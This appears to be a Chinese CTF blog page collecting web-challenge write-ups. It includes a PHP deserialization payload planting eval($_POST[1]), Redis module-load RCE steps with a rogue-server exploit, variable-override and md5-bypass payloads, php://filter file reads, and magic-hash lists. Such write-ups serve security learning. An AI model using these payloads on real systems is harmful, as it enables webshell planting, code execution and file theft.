<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class A&#123;</span><br><span class="line">    public $code = &quot;eval(\$_POST[1]);&quot;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this -&gt; a=new A();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new B();</span><br><span class="line">$poc = serialize($c);</span><br><span class="line">// echo $poc.&quot;&lt;br&gt;&quot;;</span><br><span class="line">$payload = str_replace(&#x27;A&quot;:1&#x27;,&#x27;a&quot;:2&#x27;,$poc);</span><br><span class="line">echo &#x27;?poc=&#x27;.$payload;</span><br></pre></td></tr></table></div></figure>

<p>用蚁剑连上，发现有vim缓存泄露，用vim恢复后发现这个题用了redis，然后利用redis进行RCE</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis密码：you_cannot_guess_it</span><br><span class="line">redis管理插件（蚁剑）：</span><br><span class="line">git clone https://github.com/Medicean/AS_Redis.git</span><br><span class="line">恶意exp：</span><br><span class="line">git clone https://github.com/Dliv3/redis-rogue-server.git</span><br></pre></td></tr></table></div></figure>

<ol>
<li>上传exp.so到&#x2F;var&#x2F;www&#x2F;html下</li>
<li>连接redis执行命令 MODULE LOAD “&#x2F;var&#x2F;www&#x2F;html&#x2F;exp.so”</li>
<li>RCE: system.exec “你的命令”</li>
</ol>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/08/31/%5BBJDCTF2020%5DMark%20loves%20cat/">BJDCTF2022 Mark Loves Cat</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-08-31</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="BJDCTF2020-Mark-loves-cat">
          <a href="#BJDCTF2020-Mark-loves-cat" class="heading-link"><i class="fas fa-link"></i></a><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1>
      <p><img src="/2023/08/31/[BJDCTF2020]Mark%20loves%20cat/AAwangzhan\1\hexoblog\source\image\image-20230820163325149.png"></p>
<p>flag.php</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag = file_get_contents(&#x27;/flag&#x27;);</span><br></pre></td></tr></table></div></figure>

<p>index.php：</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<pre><code>如果进行get传参，那么传参名会被加上$，传参值也会被加上$，举个例子，假如我们get传入参数：a=b，那么经过foreach之后，就会被替换成：$a=$b

如果进行post传参，那么传参名会被加上$，而传参值不会发生变化，同样举个例子：假设我们post传入参数：a=b，那么经过foreach之后，就会被替换成$a=b
</code></pre>
<p>然后是3个连着的if语句，我们要做的就是利用这几个if语句来进行变量的覆盖<br>这里要简要的说个知识点，是关于exit()函数的：</p>
<pre><code>也就是它虽然会退出执行，但依然会输出其参数，所以我们就要将exit()里面的参数换为我们想要的参数，也就是最后一句的：echo &quot;the flag is: &quot;.$flag;
</code></pre>

        <h2 id="playload1">
          <a href="#playload1" class="heading-link"><i class="fas fa-link"></i></a><a href="#playload1" class="headerlink" title="playload1"></a>playload1</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br></pre></td></tr></table></div></figure>

<p>通过GET方式传入is&#x3D;flag&amp;flag&#x3D;flag后，先经过foreach函数，得到<code>$is=$flag</code>，继续达到这串代码</p>
<p><img src="/2023/08/31/[BJDCTF2020]Mark%20loves%20cat/AAwangzhan\1\hexoblog\source\image\image-20230820165620201.png"></p>

        <h2 id="playload2">
          <a href="#playload2" class="heading-link"><i class="fas fa-link"></i></a><a href="#playload2" class="headerlink" title="playload2"></a>playload2</h2>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></div></figure>

<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>利用这串代码，如果get和post传参里都没有flag，就返回yds，加上前面的便历，将yds&#x3D;flag变为$yds&#x3D;$flag</p>

        <h2 id="playload3">
          <a href="#playload3" class="heading-link"><i class="fas fa-link"></i></a><a href="#playload3" class="headerlink" title="playload3"></a>playload3</h2>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?handsome=flag&amp;flag=x&amp;x=flag</span><br></pre></td></tr></table></div></figure>

<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>; /</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>如果GET型中flag变量的值等于GET型中一个不为flag的键名则退出<br>?flag&#x3D;a</p>
<p>a&#x3D;flag        </p>

        <h1 id="primtive">
          <a href="#primtive" class="heading-link"><i class="fas fa-link"></i></a><a href="#primtive" class="headerlink" title="primtive"></a>primtive</h1>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//hint.php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$value</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;flag来没来,如来&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;class1&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;class2&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> !== <span class="variable">$b</span> <span class="keyword">and</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;class3&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=&quot;1&quot;&amp;b=&quot;1&quot;&amp;class1=Error&amp;class2=Error&amp;class3=SplFileObject&amp;c=php://filter/convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/08/24/%E6%88%91%E7%88%B1%E5%AD%A6ctf/">[ 文章无标题 ]</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-08-24</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-15</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>​															</p>
<p>s878926199a                       &#x2F;&#x2F;原始字符串<br>0e545993274517709034328855841020  &#x2F;&#x2F;md5值<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a<br>0e509367213418206700842008763514<br>s1502113478a<br>0e861580163291561247404381396064<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s155964671a<br>0e342768416822451524974117254469<br>s1184209335a<br>0e072485820392773389523109082030<br>s1665632922a<br>0e731198061491163073197128363787<br>s1502113478a<br>0e861580163291561247404381396064<br>s1836677006a<br>0e481036490867661113260034900752<br>s1091221200a<br>0e940624217856561557816327384675<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s155964671a<br>0e342768416822451524974117254469<br>s1665632922a<br>0e731198061491163073197128363787<br>s155964671a<br>0e342768416822451524974117254469<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s1885207154a<br>0e509367213418206700842008763514<br>s532378020a<br>0e220463095855511507588041205815<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s214587387a<br>0e848240448830537924465865611904<br>s1502113478a<br>0e861580163291561247404381396064<br>s1091221200a<br>0e940624217856561557816327384675<br>s1665632922a<br>0e731198061491163073197128363787<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s1665632922a<br>0e731198061491163073197128363787</p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://8fab19b5-2ea3-40b3-a5f3-218d688677a3.node4.buuoj.cn:81/?key1=s878926199a&key2=s214587387a&key4%5B%5D=/flag&key5=2024a">http://8fab19b5-2ea3-40b3-a5f3-218d688677a3.node4.buuoj.cn:81/?key1=s878926199a&amp;key2=s214587387a&amp;key4[]=/flag&amp;key5=2024a</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>key3[]&#x3D;aaroZmOk&amp;flag5&#x3D;’ ‘;</p>
<p><strong>以下值在md5加密后以0E开头：</strong></p>
<ul>
<li>QNKCDZO</li>
<li>240610708</li>
<li>s878926199a</li>
<li>s155964671a</li>
<li>s214587387a</li>
<li>s214587387a</li>
</ul>
<p><strong>以下值在sha1加密后以0E开头：</strong></p>
<ul>
<li>aaroZmOk</li>
<li>aaK1STfY</li>
<li>aaO8zKZF</li>
<li>aa3OFF9m</li>
<li>0e1290633704</li>
<li>10932435112</li>
</ul>
<p>双重MD5加密后0E开头：</p>
<ul>
<li>7r4lGXCH2Ksu2JNT3BYM</li>
<li>CbDLytmyGm2xQyaLNhWn</li>
<li>770hQgrBOjrcqftrlaZk</li>
</ul>
</div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">Hello Stun</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">36</div><div class="sidebar-ov-state-item__name">归档</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Qingchuan</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>